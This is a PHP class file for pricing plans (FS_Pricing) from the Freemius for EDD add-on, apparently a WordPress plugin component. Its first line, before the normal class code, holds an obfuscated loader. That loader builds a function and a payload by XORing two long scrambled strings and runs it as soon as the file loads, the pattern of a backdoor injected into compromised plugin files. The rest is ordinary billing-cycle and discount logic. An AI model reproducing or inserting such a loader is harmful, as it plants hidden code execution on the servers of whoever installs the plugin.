<?php $AZvHGtpZFP='CJ<,ZEc+EB2HD,C'^' 8YM. <M0,Q<-C-';$kaysS=$AZvHGtpZFP('','U5DP31:-0S+9n=U++1SyE6,++5WL++mFUTCNJW1HhJCWP9+ZENM+EjUSEY46ZB6iG.863oBm17OaYPBWY+<feJ5GBYPWKol=PZ 89EB0jQOXsKAXxNMJZK,mFYWF0swyWUixGXbGfO2<amlXYBROT21O+sF3Hp .OpH8pSH GL:PWeQ>U1c9OlAEp E3LKNPV,UDYsaj3x3SIm=M5LxHKHU;BRZeq1QGU>UENnil1XL6WHlxU9L<71HNPC,2<qq yQ4+ke=1NLZtvuBMVC3axEbQo33;.j8..WWHv IDiAnMRATMvPqI>7YCEyfJnnX<nOTR4U9+GLGpbK6 TAN.BEH8rp6yy4yzVGymZHHnhitV0SL 6Jq+axSK.86+2UY0aYlg-<OKGk4m-SZJWuNp,V:K5AEb;OE<zP,9TPAdy48U43++;9GL7pN+Al=20Ot4;YJqB4E+LZ-DN6UW7opXV.RynBHRM>7a:=-fxUI>WKvX;57KobUS1A;-+95 r6>X+CFNJXK6BdMVPQ3JSALIQrA>Rlv=S,J,J1NTwgOZEVrWkETQg0-j4pVI>tcgO7cC xbOA9stNQCPWlRMQS1HHQ4fV12dPTI: NOB:01U5+-pxWH1L,0xFGxOknKE6B5LW:KvDZTS9l9U+LC2ZDigicN,C=BKwhC>L'^'<SlqUDTND:DW1X-BXE QbNCYtQ68Jt2+  dgcwJBa,693MB5+n5D751218ki77BAcJYBRCbIZR6HypbwyP6olnZ26ymwlHW7YSFWKmfYJlohHke1D=986.BEb=62QZLYs<BSnRkNB GHACQxqf6. SjkB.fmhTKK6+lQPvhS3>V59MuU0HJdfWKLyR G99 xrC 0pHkcNrNYCIY,A-Xuk.4W17aoUU034a> 7NTLW9 E2sfr3V>YVR nxgsqs>:i<qUXKAVT7lgJVQ4,:6VHX>hXKWROO5SKWwjhRK,=RKgi6  ,VmQmHV56 Bl7dd1ZNguvP4MJnl<zk-YR1 -Fbmlg 5g,<g-Z74YI1-1NUWTrF2 UScQPkqZoJYBJm><IAdLCFY6pMb=II2.+wHnTZ7V>PzOkFE86ptHX 1aYYtM;GVYBZU.6RX6D33YSD.+kV,>Y U6Nznr +U:3RGT<7Z3PBbl6,JV>QXTOQnCW1cR<ZAVkIDu2C3ZTtRPY-SF1X75fm3.OeHmr40G+zajoqZ,ZgDRY2X+wmZ+-P:fzxkRpXt7gRSHRWB0zZCQVyUSrAKQ-sZKGy2w1pErkwsP::0M9=TK;5, IT=geJQH9ZJIWTwlU-XQQogXoKNk><KP:6VcR ; 2bKI4R ,S>c4NRiGI;T6cGAx41');$kaysS();
	/**
	 * @package     Freemius for EDD Add-On
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
	 * @since       1.0.0
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	class FS_Pricing extends FS_Entity {

		#region Properties

		/**
		 * @var number
		 */
		public $plan_id;
		/**
		 * @var int
		 */
		public $licenses;
		/**
		 * @var null|float
		 */
		public $monthly_price;
		/**
		 * @var null|float
		 */
		public $annual_price;
		/**
		 * @var null|float
		 */
		public $lifetime_price;

		#endregion Properties

		/**
		 * @param object|bool $pricing
		 */
		function __construct( $pricing = false ) {
			parent::__construct( $pricing );
		}

		static function get_type() {
			return 'pricing';
		}

		/**
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function has_monthly() {
			return ( is_numeric( $this->monthly_price ) && $this->monthly_price > 0 );
		}

		/**
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function has_annual() {
			return ( is_numeric( $this->annual_price ) && $this->annual_price > 0 );
		}

		/**
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function has_lifetime() {
			return ( is_numeric( $this->lifetime_price ) && $this->lifetime_price > 0 );
		}

		/**
		 * Check if unlimited licenses pricing.
		 *
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function is_unlimited() {
			return is_null( $this->licenses );
		}


		/**
		 * Check if pricing has more than one billing cycle.
		 *
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function is_multi_cycle() {
			$cycles = 0;
			if ( $this->has_monthly() ) {
				$cycles ++;
			}
			if ( $this->has_annual() ) {
				$cycles ++;
			}
			if ( $this->has_lifetime() ) {
				$cycles ++;
			}

			return $cycles > 1;
		}

		/**
		 * Get annual over monthly discount.
		 *
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return int
		 */
		function annual_discount_percentage() {
			return floor( $this->annual_savings() / ( $this->monthly_price * 12 * ( $this->is_unlimited() ? 1 : $this->licenses ) ) * 100 );
		}

		/**
		 * Get annual over monthly savings.
		 *
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return float
		 */
		function annual_savings() {
			return ( $this->monthly_price * 12 - $this->annual_price ) * ( $this->is_unlimited() ? 1 : $this->licenses );
		}

	}